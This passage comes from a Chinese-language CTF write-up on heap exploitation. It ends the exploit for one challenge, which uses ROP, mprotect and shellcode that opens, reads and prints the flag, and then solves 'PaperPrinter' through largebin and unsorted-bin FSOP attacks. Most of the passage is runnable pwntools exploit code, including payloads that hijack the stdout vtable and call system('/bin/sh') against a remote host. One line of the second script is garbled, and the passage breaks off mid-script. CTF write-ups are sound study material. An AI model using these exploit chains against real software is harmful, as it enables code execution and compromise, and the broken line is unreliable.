    # backdoor execute puts(environ)
    create(1,0x120,p64(libc.sym["puts"])+p64(libc.address - static_libc + 0x7ffff7fb5d60)) 
    backdoor()
    stack_addr = u64(p.recv(6).ljust(8,"\x00"))-0x7fffffffe038+0x7fffffffdf28
    success("stack address ==> "+hex(stack_addr))
    # backdoor execute gets(ret stack addr) and call [0x100000+0x140]
    if debug:
        pop_rax = libc.address + 0x0000000000047cf8
        pop_rdi = libc.address + 0x0000000000026542
        pop_rsi = libc.address + 0x0000000000026f9e
        pop_rdx = libc.address + 0x000000000012bda6
        syscall = libc.address + 0x00000000000cf6c5
        pop_rax_call_rax = libc.address + 0x000000000014f404
    else:
        pop_rax = libc.address + 0x0000000000047cf8
        pop_rdi = libc.address + 0x0000000000026542
        pop_rsi = libc.address + 0x0000000000026f9e
        pop_rdx = libc.address + 0x000000000012bda6
        syscall = libc.address + 0x00000000000cf6c5
        pop_rax_call_rax = libc.address + 0x000000000014f404
    payload2 = asm('''
                mov rdi,0x100140
                xor rsi,rsi
                xor rdx,rdx
                mov rax,2
                syscall
                mov rdi,rax
                mov rsi,0x100200
                mov rdx,0x40
                mov rax,0
                syscall
                mov rdi,1
                mov rsi,0x100200
                mov rdx,0x40
                mov rax,1
                syscall
                ''')
    payload1 = flat([pop_rdi,0x100000,pop_rsi,0x1000,pop_rdx,7,libc.sym["mprotect"],pop_rax_call_rax,0x100000+0x140+8])
    delete(1)
    create(1,0x120,p64(libc.sym["gets"])+p64(stack_addr)+"\n")
    create(2,0x120,"flag"+"\x00"*4+payload2+"\n")
    # p.clean()
    gdb.attach(p)
    backdoor()
    raw_input()
    sl(payload1)
    # gdb.attach(p)
    p.interactive()
## 三、PaperPrinter
###  3.1 查看文件
保护全开
###  3.2 IDA分析
随机化开辟一块地址：
这道题的整体思路有点像heap_master，同样的可以无限的编辑溢出，但是区别是这里只有两次malloc的机会。两次malloc第一次是可以malloc，第二次是再exitFunc函数中有个strdup函数会malloc一次。同时没有输出函数，程序一开始给了中间两位地址，那么我们只能尝试低地址写了。  
create：
delete：
edit：
exitFunc：
大致看看strdup函数的功能：  
strdup()在内部调用了malloc()为变量分配内存，不需要使用返回的字符串时，需要用free()释放相应的内存空间，否则会造成内存泄漏。
###  3.3 思路分析
这里同样有两个思路：
**3.3.1 第一个思路：**
是利用largebin
attack改掉stdout的vtable为chunk地址，vtable+0x38为onegadet。在调用printf函数的时候会得到一次call
[vtable+0x38]的机会，同时stdout文件结构体地址作为第一个参数传入。（这是第一次见到这种攻击，虽然也是FSOP但是利用手法有差别，详情请看io_file攻击(三)）
**同样的由于该题禁了one_gadget，那么我们就得换另一个思路了**
**3.3.2 第二个思路：**
利用unsorted bin attack进行FSOP，类似第一个题目的操作。改io_file_list为fake
io_file（main_arena），io_file指向chunk（fake io file），vtable指向chunk
构造起来也是挺麻烦，大概讲讲思路吧：
**第一步** ：根据泄露的信息找到我们需要的io_file_list、system地址  
 **第二步** ：创造出足够多的空间，准备后面的delete构造small 、unsorted chunk  
 **第三步** ：根据fake file的特点在对应的位置创造出heap地址和libc地址，libc地址方便直接删除得到unsorted
bin就有了，但是heap地址我们需要在offset + 0x8位置创造出要么就是unsorted bin要么就是smallbin，large
bin。在这里我们选择smallbin，由于malloc的时候遍历unsorted
bin会归类smallbin，所以提前释放两个同样大小的chunk在unsorted bin，malloc
0x150的时候就可以在对应的位置得到heap地址了。（这是最麻烦的一步了）  
 **第四步** ：unsorted bin attack + 改掉unsorted
bin的size为0x61也为了劫持io_file_list成功，exit完成unsorted bin
attack攻击，同时归类时产生错误执行malloc_printerr
###  3.4 exp
**3.4.1 exp（思路一）**
    from pwn import *
    p = process("./pwn")
    context.log_level="debug"
    libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def edit(offset,length,content):
        p.recvuntil(":")
        p.sendline("1")
        p.recvuntil(":")
        p.sendline(str(offset))
        p.recvuntil(":")
        p.sendline(str(length))
        p.recvuntil(":")
        p.send(content)
    def delete(offset):
        p.recvuntil(":")
        p.sendline("2")
        p.recvuntil(":")
        p.sendline(str(offset))
    def show():
        p.recvuntil(":")
        p.sendline("3")
    def extra():
        p.recvuntil(":")
        p.sendline("4")
    #p = process("PaperPrinter")
    # p = remote("183.60.136.226",16145)
    sleep_addr = int(p.recvuntil("\n")[:-1]+"30",16)+0xa00000
    print hex(sleep_addr)
    stdout_vtable = sleep_addr+0x2f94c8
    one_gadget = sleep_addr-0xcc230+0x4526a
    dl_open_hook = stdout_vtable+0x3be8
    magic_gadget = stdout_vtable-0xdd26f8+0xa7a98a
    system = sleep_addr-0x86ea0
    print hex(system)
    payload = p64(0)+p64(0x411)+"/bin/sh;"+"\x00"*(0x400-8)
    edit(0,len(payload),payload)
    payload = p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x221)+p64(0)*6+p64(0)+p64(0x221)+"\x00"*0x110
    edit(0x410,len(payload),payload)
    payload = p64(0)+p64(0x411)+"\x00"*0xb0+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)+"\x00"*0x2e0+p64(0)+p64(0x21)+p64(0)*2+p64(0)+p64(0x21)
    edit(0x410+0x180,len(payload),payload)
    delete(0x440)
    delete(0x480)
    delete(0x10)
    show()
    delete(0x5a0)
    payload = p64(0)+p64(0x3f1)+p64(0)+chr((stdout_vtable-0x10)%0x100)+chr(((stdout_vtable-0x10)>>8)%0x100)+chr(((stdout_vtable-0x10)>>16)%0x100)
    edit(0,len(payload),payload)
    payload = "a"*0x10+"/bin/sh;"+"a"*0x18+"a"*8+"a"*0x10+chr((one_gadget)%0x100)+chr(((one_gadget)>>8)%0x100)+chr(((one_gadget)>>16)%0x100)
    edit(0x440,len(payload),payload)
    # gdb.attach(p)
    extra()
    p.interactive()
**3.4.2 exp（思路二）**
    #coding=utf-8
    from pwn import *
    r = lambda p:p.recv()
    rl = lambda p:p.recvline()
    ru = lambda p,x:p.recvuntil(x)
    rn = lambda p,x:p.recvn(x)
    rud = lambda p,x:p.recvuntil(x,drop=True)
    s = lambda p,x:p.send(x)
    sl = lambda p,x:p.sendline(x)
    sla = lambda p,x,y:p.sendlineafter(x,y)
    sa = lambda p,x,y:p.sendafter(x,y)
    context.update(arch='amd64',os='linux',log_level='info')
    context.log_level = "debug"
    debug = 1
    elf = ELF('./pwn')
    libc_offset = 0x3c4b20
    gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    if debug:
        p = process('./pwn')
    else:
        p = remote('183.60.136.226',16145)
    def edit(offset,sz,content):
        p.recvuntil('Input your choice:')
        p.sendline('1')
        p.recvuntil("Input the offset :")
        p.sendline(str(offset))
        p.recvuntil("Input the length :")
        p.sendline(str(sz))
        p.recvuntil("Input the content :")
        p.send(content)
    def create():
        p.recvuntil('Input your choice:')
        p.sendline('3')
    def delete(offset):
        p.recvuntil('Input your choice:')
        p.sendline('2')
        p.recvuntil("Input the offset :")
        p.sendline(str(offset))
    def exit():
        p.recvuntil('Input your choice:')
        p.sendline('4')
    #leak libc
    p.recvuntil("0x")
    libc_addr = int(p.recvline().strip('\n'),16)
    libc_addr = (libc_addr  " + hex(libc_addr))
    system_addr = libc_addr + libc.sym['system']
    io_list_all = libc_addr + libc.sym['_IO_list_all']
    log.success("system addr => " + hex(system_addr))